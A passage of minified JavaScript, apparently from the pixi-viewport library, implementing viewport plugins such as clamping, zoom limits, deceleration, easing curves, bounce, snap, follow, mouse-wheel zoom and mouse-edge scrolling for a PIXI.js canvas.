                    } else null !== this.options.top && this.parent.top < (!0 === this.options.top ? 0 : this.options.top) && (this.parent.y = -(!0 === this.options.top ? 0 : this.options.top) * this.parent.scale.y,
                        n = !(e.y = 0)), null !== this.options.bottom && this.parent.bottom > (!0 === this.options.bottom ? this.parent.worldHeight : this.options.bottom) && (this.parent.y = -(!0 === this.options.bottom ? this.parent.worldHeight : this.options.bottom) * this.parent.scale.y + this.parent.screenHeight,
                            n = !(e.y = 0));
                    n && this.parent.emit("moved", {
                        viewport: this.parent,
                        original: t,
                        type: "clamp-y"
                    });
                }
                this.last.x = this.parent.x, this.last.y = this.parent.y, this.last.scaleX = this.parent.scale.x,
                    this.last.scaleY = this.parent.scale.y;
            }
        }
    }, {
        key: "reset",
        value: function () {
            this.update();
        }
    }]), i;
}(), clampZoomOptions = {
    minWidth: null,
    minHeight: null,
    maxWidth: null,
    maxHeight: null,
    minScale: null,
    maxScale: null
}, ClampZoom = function () {
    function i(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, t = (classCallCheck(this, i),
            possibleConstructorReturn(this, (i.__proto__ || Object.getPrototypeOf(i)).call(this, t)));
        return t.options = Object.assign({}, clampZoomOptions, e), t.clamp(), t;
    }
    return inherits(i, Plugin), createClass(i, [{
        key: "resize",
        value: function () {
            this.clamp();
        }
    }, {
        key: "clamp",
        value: function () {
            var t, e, i;
            this.paused || (this.options.minWidth || this.options.minHeight || this.options.maxWidth || this.options.maxHeight ? (i = this.parent.worldScreenWidth,
                t = this.parent.worldScreenHeight, null !== this.options.minWidth && i < this.options.minWidth && (e = this.parent.scale.x,
                    this.parent.fitWidth(this.options.minWidth, !1, !1, !0), this.parent.scale.y *= this.parent.scale.x / e,
                    i = this.parent.worldScreenWidth, t = this.parent.worldScreenHeight, this.parent.emit("zoomed", {
                        viewport: this.parent,
                        type: "clamp-zoom"
                    })), null !== this.options.maxWidth && i > this.options.maxWidth && (e = this.parent.scale.x,
                        this.parent.fitWidth(this.options.maxWidth, !1, !1, !0), this.parent.scale.y *= this.parent.scale.x / e,
                        i = this.parent.worldScreenWidth, t = this.parent.worldScreenHeight, this.parent.emit("zoomed", {
                            viewport: this.parent,
                            type: "clamp-zoom"
                        })), null !== this.options.minHeight && t < this.options.minHeight && (e = this.parent.scale.y,
                            this.parent.fitHeight(this.options.minHeight, !1, !1, !0), this.parent.scale.x *= this.parent.scale.y / e,
                            i = this.parent.worldScreenWidth, t = this.parent.worldScreenHeight, this.parent.emit("zoomed", {
                                viewport: this.parent,
                                type: "clamp-zoom"
                            })), null !== this.options.maxHeight && t > this.options.maxHeight && (e = this.parent.scale.y,
                                this.parent.fitHeight(this.options.maxHeight, !1, !1, !0), this.parent.scale.x *= this.parent.scale.y / e,
                                this.parent.emit("zoomed", {
                                    viewport: this.parent,
                                    type: "clamp-zoom"
                                }))) : (i = this.parent.scale.x, null !== this.options.minScale && i < this.options.minScale && (i = this.options.minScale),
                                    (i = null !== this.options.maxScale && i > this.options.maxScale ? this.options.maxScale : i) !== this.parent.scale.x && (this.parent.scale.set(i),
                                        this.parent.emit("zoomed", {
                                            viewport: this.parent,
                                            type: "clamp-zoom"
                                        }))));
        }
    }, {
        key: "reset",
        value: function () {
            this.clamp();
        }
    }]), i;
}(), decelerateOptions = {
    friction: .95,
    bounce: .8,
    minSpeed: .01
}, Decelerate = function () {
    function n(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, i = (classCallCheck(this, n),
            possibleConstructorReturn(this, (n.__proto__ || Object.getPrototypeOf(n)).call(this, t)));
        return i.options = Object.assign({}, decelerateOptions, e), i.saved = [], i.reset(),
            i.parent.on("moved", function (t) {
                return i.moved(t);
            }), i;
    }
    return inherits(n, Plugin), createClass(n, [{
        key: "destroy",
        value: function () {
            this.parent;
        }
    }, {
        key: "down",
        value: function () {
            this.saved = [], this.x = this.y = !1;
        }
    }, {
        key: "isActive",
        value: function () {
            return this.x || this.y;
        }
    }, {
        key: "move",
        value: function () {
            var t;
            this.paused || (1 === (t = this.parent.input.count()) || 1 < t && !this.parent.plugins.get("pinch")) && (this.saved.push({
                x: this.parent.x,
                y: this.parent.y,
                time: performance.now()
            }), 60 < this.saved.length) && this.saved.splice(0, 30);
        }
    }, {
        key: "moved",
        value: function (t) {
            var e;
            this.saved.length && (e = this.saved[this.saved.length - 1], "clamp-x" === t.type ? e.x === t.original.x && (e.x = this.parent.x) : "clamp-y" === t.type && e.y === t.original.y && (e.y = this.parent.y));
        }
    }, {
        key: "up",
        value: function () {
            if (0 === this.parent.input.count() && this.saved.length) {
                var t = performance.now(), e = !0, i = !1, n = void 0;
                try {
                    for (var s, r = this.saved[Symbol.iterator](); !(e = (s = r.next()).done); e = !0) {
                        var a = s.value;
                        if (a.time >= t - 100) {
                            var o = t - a.time;
                            this.x = (this.parent.x - a.x) / o, this.y = (this.parent.y - a.y) / o, this.percentChangeX = this.percentChangeY = this.options.friction;
                            break;
                        }
                    }
                } catch (t) {
                    i = !0, n = t;
                } finally {
                    try {
                        !e && r.return && r.return();
                    } finally {
                        if (i) throw n;
                    }
                }
            }
        }
    }, {
        key: "activate",
        value: function (t) {
            void 0 !== (t = t || {}).x && (this.x = t.x, this.percentChangeX = this.options.friction),
                void 0 !== t.y && (this.y = t.y, this.percentChangeY = this.options.friction);
        }
    }, {
        key: "update",
        value: function (t) {
            var e;
            this.paused || (e = void 0, this.x && (this.parent.x += this.x * t, this.x *= this.percentChangeX,
                Math.abs(this.x) < this.options.minSpeed && (this.x = 0), e = !0), this.y && (this.parent.y += this.y * t,
                    this.y *= this.percentChangeY, Math.abs(this.y) < this.options.minSpeed && (this.y = 0),
                    e = !0), e && this.parent.emit("moved", {
                        viewport: this.parent,
                        type: "decelerate"
                    }));
        }
    }, {
        key: "reset",
        value: function () {
            this.x = this.y = null;
        }
    }]), n;
}(), commonjsGlobal$1 = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : {};

function createCommonjsModule$1(t, e) {
    return t(e = {
        exports: {}
    }, e.exports), e.exports;
}

var penner = createCommonjsModule$1(function (t, e) {
    !function () {
        var s = {
            linear: function (t, e, i, n) {
                return i * t / n + e;
            },
            easeInQuad: function (t, e, i, n) {
                return i * (t /= n) * t + e;
            },
            easeOutQuad: function (t, e, i, n) {
                return -i * (t /= n) * (t - 2) + e;
            },
            easeInOutQuad: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t + e : -i / 2 * (--t * (t - 2) - 1) + e;
            },
            easeInCubic: function (t, e, i, n) {
                return i * (t /= n) * t * t + e;
            },
            easeOutCubic: function (t, e, i, n) {
                return i * ((t = t / n - 1) * t * t + 1) + e;
            },
            easeInOutCubic: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t * t + e : i / 2 * ((t -= 2) * t * t + 2) + e;
            },
            easeInQuart: function (t, e, i, n) {
                return i * (t /= n) * t * t * t + e;
            },
            easeOutQuart: function (t, e, i, n) {
                return -i * ((t = t / n - 1) * t * t * t - 1) + e;
            },
            easeInOutQuart: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t * t * t + e : -i / 2 * ((t -= 2) * t * t * t - 2) + e;
            },
            easeInQuint: function (t, e, i, n) {
                return i * (t /= n) * t * t * t * t + e;
            },
            easeOutQuint: function (t, e, i, n) {
                return i * ((t = t / n - 1) * t * t * t * t + 1) + e;
            },
            easeInOutQuint: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t * t * t * t + e : i / 2 * ((t -= 2) * t * t * t * t + 2) + e;
            },
            easeInSine: function (t, e, i, n) {
                return -i * Math.cos(t / n * (Math.PI / 2)) + i + e;
            },
            easeOutSine: function (t, e, i, n) {
                return i * Math.sin(t / n * (Math.PI / 2)) + e;
            },
            easeInOutSine: function (t, e, i, n) {
                return -i / 2 * (Math.cos(Math.PI * t / n) - 1) + e;
            },
            easeInExpo: function (t, e, i, n) {
                return 0 === t ? e : i * Math.pow(2, 10 * (t / n - 1)) + e;
            },
            easeOutExpo: function (t, e, i, n) {
                return t === n ? e + i : i * (1 - Math.pow(2, -10 * t / n)) + e;
            },
            easeInOutExpo: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * Math.pow(2, 10 * (t - 1)) + e : i / 2 * (2 - Math.pow(2, -10 * --t)) + e;
            },
            easeInCirc: function (t, e, i, n) {
                return -i * (Math.sqrt(1 - (t /= n) * t) - 1) + e;
            },
            easeOutCirc: function (t, e, i, n) {
                return i * Math.sqrt(1 - (t = t / n - 1) * t) + e;
            },
            easeInOutCirc: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? -i / 2 * (Math.sqrt(1 - t * t) - 1) + e : i / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1) + e;
            },
            easeInElastic: function (t, e, i, n) {
                var s, r = i;
                return 0 !== t && (t /= n), s = .3 * n, i = r < Math.abs(i) ? (r = i, s / 4) : s / (2 * Math.PI) * Math.asin(i / r),
                    -(r * Math.pow(2, 10 * --t) * Math.sin((t * n - i) * (2 * Math.PI) / s)) + e;
            },
            easeOutElastic: function (t, e, i, n) {
                var s, r, a = i;
                return 0 !== t && (t /= n), r = .3 * n, s = a < Math.abs(i) ? (a = i, r / 4) : r / (2 * Math.PI) * Math.asin(i / a),
                    a * Math.pow(2, -10 * t) * Math.sin((t * n - s) * (2 * Math.PI) / r) + i + e;
            },
            easeInOutElastic: function (t, e, i, n) {
                var s, r, a = i;
                return 0 !== t && (t /= n / 2), r = n * (.3 * 1.5), s = a < Math.abs(i) ? (a = i,
                    r / 4) : r / (2 * Math.PI) * Math.asin(i / a), t < 1 ? a * Math.pow(2, 10 * --t) * Math.sin((t * n - s) * (2 * Math.PI) / r) * -.5 + e : a * Math.pow(2, -10 * --t) * Math.sin((t * n - s) * (2 * Math.PI) / r) * .5 + i + e;
            },
            easeInBack: function (t, e, i, n, s) {
                return i * (t /= n) * t * (((s = void 0 === s ? 1.70158 : s) + 1) * t - s) + e;
            },
            easeOutBack: function (t, e, i, n, s) {
                return i * ((t = t / n - 1) * t * (((s = void 0 === s ? 1.70158 : s) + 1) * t + s) + 1) + e;
            },
            easeInOutBack: function (t, e, i, n, s) {
                return void 0 === s && (s = 1.70158), (t /= n / 2) < 1 ? i / 2 * (t * t * ((1 + (s *= 1.525)) * t - s)) + e : i / 2 * ((t -= 2) * t * ((1 + (s *= 1.525)) * t + s) + 2) + e;
            },
            easeInBounce: function (t, e, i, n) {
                return i - s.easeOutBounce(n - t, 0, i, n) + e;
            },
            easeOutBounce: function (t, e, i, n) {
                return (t /= n) < 1 / 2.75 ? i * (7.5625 * t * t) + e : t < 2 / 2.75 ? i * (7.5625 * (t -= 1.5 / 2.75) * t + .75) + e : t < 2.5 / 2.75 ? i * (7.5625 * (t -= 2.25 / 2.75) * t + .9375) + e : i * (7.5625 * (t -= 2.625 / 2.75) * t + .984375) + e;
            },
            easeInOutBounce: function (t, e, i, n) {
                return t < n / 2 ? .5 * s.easeInBounce(2 * t, 0, i, n) + e : .5 * s.easeOutBounce(2 * t - n, 0, i, n) + .5 * i + e;
            }
        };
        t.exports = s;
    }.call(commonjsGlobal$1);
});

function ease(t, e) {
    return t ? "function" == typeof t ? t : "string" == typeof t ? penner[t] : void 0 : penner[e];
}

var bounceOptions = {
    sides: "all",
    friction: .5,
    time: 150,
    ease: "easeInOutSine",
    underflow: "center",
    bounceBox: null
}, Bounce = function () {
    function i(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, t = (classCallCheck(this, i),
            possibleConstructorReturn(this, (i.__proto__ || Object.getPrototypeOf(i)).call(this, t)));
        return t.options = Object.assign({}, bounceOptions, e), t.ease = ease(t.options.ease, "easeInOutSine"),
            t.options.sides && ("all" === t.options.sides ? t.top = t.bottom = t.left = t.right = !0 : "horizontal" === t.options.sides ? t.right = t.left = !0 : "vertical" === t.options.sides ? t.top = t.bottom = !0 : (t.top = -1 !== t.options.sides.indexOf("top"),
                t.bottom = -1 !== t.options.sides.indexOf("bottom"), t.left = -1 !== t.options.sides.indexOf("left"),
                t.right = -1 !== t.options.sides.indexOf("right"))), t.parseUnderflow(), t.last = {},
            t.reset(), t;
    }
    return inherits(i, Plugin), createClass(i, [{
        key: "parseUnderflow",
        value: function () {
            var t = this.options.underflow.toLowerCase();
            "center" === t ? (this.underflowX = 0, this.underflowY = 0) : (this.underflowX = -1 !== t.indexOf("left") ? -1 : -1 !== t.indexOf("right") ? 1 : 0,
                this.underflowY = -1 !== t.indexOf("top") ? -1 : -1 !== t.indexOf("bottom") ? 1 : 0);
        }
    }, {
        key: "isActive",
        value: function () {
            return null !== this.toX || null !== this.toY;
        }
    }, {
        key: "down",
        value: function () {
            this.toX = this.toY = null;
        }
    }, {
        key: "up",
        value: function () {
            this.bounce();
        }
    }, {
        key: "update",
        value: function (t) {
            var e;
            this.paused || (this.bounce(), this.toX && ((e = this.toX).time += t, this.parent.emit("moved", {
                viewport: this.parent,
                type: "bounce-x"
            }), e.time >= this.options.time ? (this.parent.x = e.end, this.toX = null, this.parent.emit("bounce-x-end", this.parent)) : this.parent.x = this.ease(e.time, e.start, e.delta, this.options.time)),
                this.toY && ((e = this.toY).time += t, this.parent.emit("moved", {
                    viewport: this.parent,
                    type: "bounce-y"
                }), e.time >= this.options.time ? (this.parent.y = e.end, this.toY = null, this.parent.emit("bounce-y-end", this.parent)) : this.parent.y = this.ease(e.time, e.start, e.delta, this.options.time)));
        }
    }, {
        key: "calcUnderflowX",
        value: function () {
            var t = void 0;
            switch (this.underflowX) {
                case -1:
                    t = 0;
                    break;

                case 1:
                    t = this.parent.screenWidth - this.parent.screenWorldWidth;
                    break;

                default:
                    t = (this.parent.screenWidth - this.parent.screenWorldWidth) / 2;
            }
            return t;
        }
    }, {
        key: "calcUnderflowY",
        value: function () {
            var t = void 0;
            switch (this.underflowY) {
                case -1:
                    t = 0;
                    break;

                case 1:
                    t = this.parent.screenHeight - this.parent.screenWorldHeight;
                    break;

                default:
                    t = (this.parent.screenHeight - this.parent.screenWorldHeight) / 2;
            }
            return t;
        }
    }, {
        key: "oob",
        value: function () {
            var t, e, i, n = this.options.bounceBox;
            return n ? (t = void 0 === n.x ? 0 : n.x, e = void 0 === n.y ? 0 : n.y, i = void 0 === n.width ? this.parent.worldWidth : n.width,
                n = void 0 === n.height ? this.parent.worldHeight : n.height, {
                left: this.parent.left < t,
                right: this.parent.right > i,
                top: this.parent.top < e,
                bottom: this.parent.bottom > n,
                topLeft: new PIXI$1.Point(t * this.parent.scale.x, e * this.parent.scale.y),
                bottomRight: new PIXI$1.Point(i * this.parent.scale.x - this.parent.screenWidth, n * this.parent.scale.y - this.parent.screenHeight)
            }) : {
                left: this.parent.left < 0,
                right: this.parent.right > this.parent.worldWidth,
                top: this.parent.top < 0,
                bottom: this.parent.bottom > this.parent.worldHeight,
                topLeft: new PIXI$1.Point(0, 0),
                bottomRight: new PIXI$1.Point(this.parent.worldWidth * this.parent.scale.x - this.parent.screenWidth, this.parent.worldHeight * this.parent.scale.y - this.parent.screenHeight)
            };
        }
    }, {
        key: "bounce",
        value: function () {
            var t, e, i, n, s;
            this.paused || (t = void 0, (s = this.parent.plugins.get("decelerate")) && (s.x || s.y) && (s.x && s.percentChangeX === s.options.friction || s.y && s.percentChangeY === s.options.friction) && (((t = this.oob()).left && this.left || t.right && this.right) && (s.percentChangeX = this.options.friction),
                t.top && this.top || t.bottom && this.bottom) && (s.percentChangeY = this.options.friction),
                e = this.parent.plugins.get("drag") || {}, i = this.parent.plugins.get("pinch") || {},
                s = s || {}, e.active) || i.active || this.toX && this.toY || s.x && s.y || (e = (t = t || this.oob()).topLeft,
                    i = t.bottomRight, this.toX || s.x || (n = null, t.left && this.left ? n = this.parent.screenWorldWidth < this.parent.screenWidth ? this.calcUnderflowX() : -e.x : t.right && this.right && (n = this.parent.screenWorldWidth < this.parent.screenWidth ? this.calcUnderflowX() : -i.x),
                        null !== n && this.parent.x !== n && (this.toX = {
                            time: 0,
                            start: this.parent.x,
                            delta: n - this.parent.x,
                            end: n
                        }, this.parent.emit("bounce-x-start", this.parent))), this.toY) || s.y || (n = null,
                            t.top && this.top ? n = this.parent.screenWorldHeight < this.parent.screenHeight ? this.calcUnderflowY() : -e.y : t.bottom && this.bottom && (n = this.parent.screenWorldHeight < this.parent.screenHeight ? this.calcUnderflowY() : -i.y),
                            null !== n && this.parent.y !== n && (this.toY = {
                                time: 0,
                                start: this.parent.y,
                                delta: n - this.parent.y,
                                end: n
                            }, this.parent.emit("bounce-y-start", this.parent)));
        }
    }, {
        key: "reset",
        value: function () {
            this.toX = this.toY = null, this.bounce();
        }
    }]), i;
}(), snapOptions = {
    topLeft: !1,
    friction: .8,
    time: 1e3,
    ease: "easeInOutSine",
    interrupt: !0,
    removeOnComplete: !1,
    removeOnInterrupt: !1,
    forceStart: !1
}, Snap = function () {
    function s(t, e, i) {
        var n = 3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : {}, t = (classCallCheck(this, s),
            possibleConstructorReturn(this, (s.__proto__ || Object.getPrototypeOf(s)).call(this, t)));
        return t.options = Object.assign({}, snapOptions, n), t.ease = ease(n.ease, "easeInOutSine"),
            t.x = e, t.y = i, t.options.forceStart && t.snapStart(), t;
    }
    return inherits(s, Plugin), createClass(s, [{
        key: "snapStart",
        value: function () {
            this.percent = 0, this.snapping = {
                time: 0
            };
            var t = this.options.topLeft ? this.parent.corner : this.parent.center;
            this.deltaX = this.x - t.x, this.deltaY = this.y - t.y, this.startX = t.x, this.startY = t.y,
                this.parent.emit("snap-start", this.parent);
        }
    }, {
        key: "wheel",
        value: function () {
            this.options.removeOnInterrupt && this.parent.plugins.remove("snap");
        }
    }, {
        key: "down",
        value: function () {
            this.options.removeOnInterrupt ? this.parent.plugins.remove("snap") : this.options.interrupt && (this.snapping = null);
        }
    }, {
        key: "up",
        value: function () {
            var t;
            0 === this.parent.input.count() && (t = this.parent.plugins.get("decelerate")) && (t.x || t.y) && (t.percentChangeX = t.percentChangeY = this.options.friction);
        }
    }, {
        key: "update",
        value: function (t) {
            var e, i, n;
            this.paused || this.options.interrupt && 0 !== this.parent.input.count() || (this.snapping ? (t = void ((n = this.snapping).time += t),
                e = void 0, i = n.time > this.options.time ? (t = !0, e = this.startX + this.deltaX,
                    this.startY + this.deltaY) : (n = this.ease(n.time, 0, 1, this.options.time), e = this.startX + this.deltaX * n,
                        this.startY + this.deltaY * n), this.options.topLeft ? this.parent.moveCorner(e, i) : this.parent.moveCenter(e, i),
                this.parent.emit("moved", {
                    viewport: this.parent,
                    type: "snap"
                }), t && (this.options.removeOnComplete && this.parent.plugins.remove("snap"), this.parent.emit("snap-end", this.parent),
                    this.snapping = null)) : (n = this.options.topLeft ? this.parent.corner : this.parent.center).x === this.x && n.y === this.y || this.snapStart());
        }
    }]), s;
}(), snapZoomOptions = {
    width: 0,
    height: 0,
    time: 1e3,
    ease: "easeInOutSine",
    center: null,
    interrupt: !0,
    removeOnComplete: !1,
    removeOnInterrupts: !1,
    forceStart: !1,
    noMove: !1
}, SnapZoom = function () {
    function n(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, i = (classCallCheck(this, n),
            possibleConstructorReturn(this, (n.__proto__ || Object.getPrototypeOf(n)).call(this, t)));
        return i.options = Object.assign({}, snapZoomOptions, e), i.ease = ease(i.options.ease),
            0 < i.options.width && (i.xScale = t.screenWidth / i.options.width), 0 < i.options.height && (i.yScale = t.screenHeight / i.options.height),
            i.xIndependent = !!i.xScale, i.yIndependent = !!i.yScale, i.xScale = i.xIndependent ? i.xScale : i.yScale,
            i.yScale = i.yIndependent ? i.yScale : i.xScale, 0 === i.options.time ? (t.container.scale.x = i.xScale,
                t.container.scale.y = i.yScale, i.options.removeOnComplete && i.parent.plugins.remove("snap-zoom")) : e.forceStart && i.createSnapping(),
            i;
    }
    return inherits(n, Plugin), createClass(n, [{
        key: "createSnapping",
        value: function () {
            var t = this.parent.scale;
            this.snapping = {
                time: 0,
                startX: t.x,
                startY: t.y,
                deltaX: this.xScale - t.x,
                deltaY: this.yScale - t.y
            }, this.parent.emit("snap-zoom-start", this.parent);
        }
    }, {
        key: "resize",
        value: function () {
            this.snapping = null, 0 < this.options.width && (this.xScale = this.parent.screenWidth / this.options.width),
                0 < this.options.height && (this.yScale = this.parent.screenHeight / this.options.height),
                this.xScale = this.xIndependent ? this.xScale : this.yScale, this.yScale = this.yIndependent ? this.yScale : this.xScale;
        }
    }, {
        key: "wheel",
        value: function () {
            this.options.removeOnInterrupt && this.parent.plugins.remove("snap-zoom");
        }
    }, {
        key: "down",
        value: function () {
            this.options.removeOnInterrupt ? this.parent.plugins.remove("snap-zoom") : this.options.interrupt && (this.snapping = null);
        }
    }, {
        key: "update",
        value: function (t) {
            var e, i;
            this.paused || this.options.interrupt && 0 !== this.parent.input.count() || (e = void 0,
                this.options.center || this.options.noMove || (e = this.parent.center), this.snapping ? this.snapping && ((i = this.snapping).time += t,
                    i.time >= this.options.time ? (this.parent.scale.set(this.xScale, this.yScale),
                        this.options.removeOnComplete && this.parent.plugins.remove("snap-zoom"), this.parent.emit("snap-zoom-end", this.parent),
                        this.snapping = null) : (t = this.snapping, this.parent.scale.x = this.ease(t.time, t.startX, t.deltaX, this.options.time),
                            this.parent.scale.y = this.ease(t.time, t.startY, t.deltaY, this.options.time)),
                    (i = this.parent.plugins.get("clamp-zoom")) && i.clamp(), this.options.noMove || (this.options.center ? this.parent.moveCenter(this.options.center) : this.parent.moveCenter(e))) : this.parent.scale.x === this.xScale && this.parent.scale.y === this.yScale || this.createSnapping());
        }
    }, {
        key: "resume",
        value: function () {
            this.snapping = null, get(n.prototype.__proto__ || Object.getPrototypeOf(n.prototype), "resume", this).call(this);
        }
    }]), n;
}(), followOptions = {
    speed: 0,
    acceleration: null,
    radius: null
}, Follow = function () {
    function n(t, e) {
        var i = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : {}, t = (classCallCheck(this, n),
            possibleConstructorReturn(this, (n.__proto__ || Object.getPrototypeOf(n)).call(this, t)));
        return t.target = e, t.options = Object.assign({}, followOptions, i), t.velocity = {
            x: 0,
            y: 0
        }, t;
    }
    return inherits(n, Plugin), createClass(n, [{
        key: "update",
        value: function (t) {
            if (!this.paused) {
                var e = this.parent.center, i = this.target.x, n = this.target.y;
                if (this.options.radius) {
                    if (!(Math.sqrt(Math.pow(this.target.y - e.y, 2) + Math.pow(this.target.x - e.x, 2)) > this.options.radius)) return;
                    var s = Math.atan2(this.target.y - e.y, this.target.x - e.x), i = this.target.x - Math.cos(s) * this.options.radius, n = this.target.y - Math.sin(s) * this.options.radius;
                }
                var r, a, o, s = i - e.x, l = n - e.y;
                (s || l) && (this.options.speed ? this.options.acceleration ? (a = Math.atan2(n - e.y, i - e.x),
                    (r = Math.sqrt(Math.pow(s, 2) + Math.pow(l, 2))) && (o = (Math.pow(this.velocity.x, 2) + Math.pow(this.velocity.y, 2)) / (2 * this.options.acceleration),
                        this.velocity = o < r ? {
                            x: Math.min(this.velocity.x + this.options.acceleration * t, this.options.speed),
                            y: Math.min(this.velocity.y + this.options.acceleration * t, this.options.speed)
                        } : {
                            x: Math.max(this.velocity.x - this.options.acceleration * this.options.speed, 0),
                            y: Math.max(this.velocity.y - this.options.acceleration * this.options.speed, 0)
                        }, o = Math.cos(a) * this.velocity.x, r = Math.sin(a) * this.velocity.y, t = Math.abs(o) > Math.abs(s) ? i : e.x + o,
                        a = Math.abs(r) > Math.abs(l) ? n : e.y + r, this.parent.moveCenter(t, a), this.parent.emit("moved", {
                            viewport: this.parent,
                            type: "follow"
                        }))) : (o = Math.atan2(n - e.y, i - e.x), r = Math.cos(o) * this.options.speed,
                            t = Math.sin(o) * this.options.speed, a = Math.abs(r) > Math.abs(s) ? i : e.x + r,
                            o = Math.abs(t) > Math.abs(l) ? n : e.y + t, this.parent.moveCenter(a, o), this.parent.emit("moved", {
                                viewport: this.parent,
                                type: "follow"
                            })) : (this.parent.moveCenter(i, n), this.parent.emit("moved", {
                                viewport: this.parent,
                                type: "follow"
                            })));
            }
        }
    }]), n;
}(), wheelOptions = {
    percent: .1,
    smooth: !1,
    interrupt: !0,
    reverse: !1,
    center: null,
    lineHeight: 20
}, Wheel = function () {
    function i(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, t = (classCallCheck(this, i),
            possibleConstructorReturn(this, (i.__proto__ || Object.getPrototypeOf(i)).call(this, t)));
        return t.options = Object.assign({}, wheelOptions, e), t;
    }
    return inherits(i, Plugin), createClass(i, [{
        key: "down",
        value: function () {
            this.options.interrupt && (this.smoothing = null);
        }
    }, {
        key: "update",
        value: function () {
            var t, e, i;
            this.smoothing && (t = this.smoothingCenter, i = this.smoothing, e = void 0, this.options.center || (e = this.parent.toLocal(t)),
                this.parent.scale.x += i.x, this.parent.scale.y += i.y, this.parent.emit("zoomed", {
                    viewport: this.parent,
                    type: "wheel"
                }), (i = this.parent.plugins.get("clamp-zoom")) && i.clamp(), this.options.center ? this.parent.moveCenter(this.options.center) : (i = this.parent.toGlobal(e),
                    this.parent.x += t.x - i.x, this.parent.y += t.y - i.y), this.parent.emit("moved", {
                        viewport: this.parent,
                        type: "wheel"
                    }), this.smoothingCount++, this.smoothingCount >= this.options.smooth) && (this.smoothing = null);
        }
    }, {
        key: "wheel",
        value: function (t) {
            var e, i, n, s;
            if (!this.paused) return e = this.parent.input.getPointerPosition(t), s = (this.options.reverse ? -1 : 1) * -t.deltaY * (t.deltaMode ? this.options.lineHeight : 1) / 500,
                s = Math.pow(2, (1 + this.options.percent) * s), this.options.smooth ? (i = this.smoothing ? this.smoothing.x * (this.options.smooth - this.smoothingCount) : 0,
                    n = this.smoothing ? this.smoothing.y * (this.options.smooth - this.smoothingCount) : 0,
                    this.smoothing = {
                        x: ((this.parent.scale.x + i) * s - this.parent.scale.x) / this.options.smooth,
                        y: ((this.parent.scale.y + n) * s - this.parent.scale.y) / this.options.smooth
                    }, this.smoothingCount = 0, this.smoothingCenter = e) : (i = void 0, this.options.center || (i = this.parent.toLocal(e)),
                        this.parent.scale.x *= s, this.parent.scale.y *= s, this.parent.emit("zoomed", {
                            viewport: this.parent,
                            type: "wheel"
                        }), (n = this.parent.plugins.get("clamp-zoom")) && n.clamp(), this.options.center ? this.parent.moveCenter(this.options.center) : (s = this.parent.toGlobal(i),
                            this.parent.x += e.x - s.x, this.parent.y += e.y - s.y)), this.parent.emit("moved", {
                                viewport: this.parent,
                                type: "wheel"
                            }), this.parent.emit("wheel", {
                                wheel: {
                                    dx: t.deltaX,
                                    dy: t.deltaY,
                                    dz: t.deltaZ
                                },
                                event: t,
                                viewport: this.parent
                            }), !this.parent.options.passiveWheel || void 0;
        }
    }]), i;
}(), mouseEdgesOptions = {
    radius: null,
    distance: null,
    top: null,
    bottom: null,
    left: null,
    right: null,
    speed: 8,
    reverse: !1,
    noDecelerate: !1,
    linear: !1,
    allowButtons: !1
}, MouseEdges = function () {
    function i(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, t = (classCallCheck(this, i),
            possibleConstructorReturn(this, (i.__proto__ || Object.getPrototypeOf(i)).call(this, t)));
        return t.options = Object.assign({}, mouseEdgesOptions, e), t.reverse = t.options.reverse ? 1 : -1,
            t.radiusSquared = Math.pow(t.options.radius, 2), t.resize(), t;
    }
    return inherits(i, Plugin), createClass(i, [{
        key: "resize",
        value: function () {
            var t = this.options.distance;
            null !== t ? (this.left = t, this.top = t, this.right = this.parent.worldScreenWidth - t,
                this.bottom = this.parent.worldScreenHeight - t) : this.radius || (this.left = this.options.left,
                    this.top = this.options.top, this.right = null === this.options.right ? null : this.parent.worldScreenWidth - this.options.right,
                    this.bottom = null === this.options.bottom ? null : this.parent.worldScreenHeight - this.options.bottom);
        }
    }, {
        key: "down",
        value: function () {
            this.options.allowButtons || (this.horizontal = this.vertical = null);
        }
    }, {
        key: "move",
        value: function (t) {
            var e, i;
            "mouse" !== t.data.pointerType && 1 !== t.data.identifier || !this.options.allowButtons && 0 !== t.data.buttons || (e = t.data.global.x,
                t = t.data.global.y, this.radiusSquared ? (i = this.parent.toScreen(this.parent.center),
                    Math.pow(i.x - e, 2) + Math.pow(i.y - t, 2) >= this.radiusSquared ? (i = Math.atan2(i.y - t, i.x - e),
                        this.options.linear ? (this.horizontal = Math.round(Math.cos(i)) * this.options.speed * this.reverse * .06,
                            this.vertical = Math.round(Math.sin(i)) * this.options.speed * this.reverse * .06) : (this.horizontal = Math.cos(i) * this.options.speed * this.reverse * .06,
                                this.vertical = Math.sin(i) * this.options.speed * this.reverse * .06)) : (this.horizontal && this.decelerateHorizontal(),
                                    this.vertical && this.decelerateVertical(), this.horizontal = this.vertical = 0)) : (null !== this.left && e < this.left ? this.horizontal = +this.reverse * this.options.speed * .06 : null !== this.right && e > this.right ? this.horizontal = -1 * this.reverse * this.options.speed * .06 : (this.decelerateHorizontal(),
                                        this.horizontal = 0), null !== this.top && t < this.top ? this.vertical = +this.reverse * this.options.speed * .06 : null !== this.bottom && t > this.bottom ? this.vertical = -1 * this.reverse * this.options.speed * .06 : (this.decelerateVertical(),
                                            this.vertical = 0)));
        }
    }, {
        key: "decelerateHorizontal",
        value: function () {
            var t = this.parent.plugins.get("decelerate");
            this.horizontal && t && !this.options.noDecelerate && t.activate({
                x: this.horizontal * this.options.speed * this.reverse / (1e3 / 60)
            });
        }
    }, {
        key: "decelerateVertical",
        value: function () {
            var t = this.parent.plugins.get("decelerate");
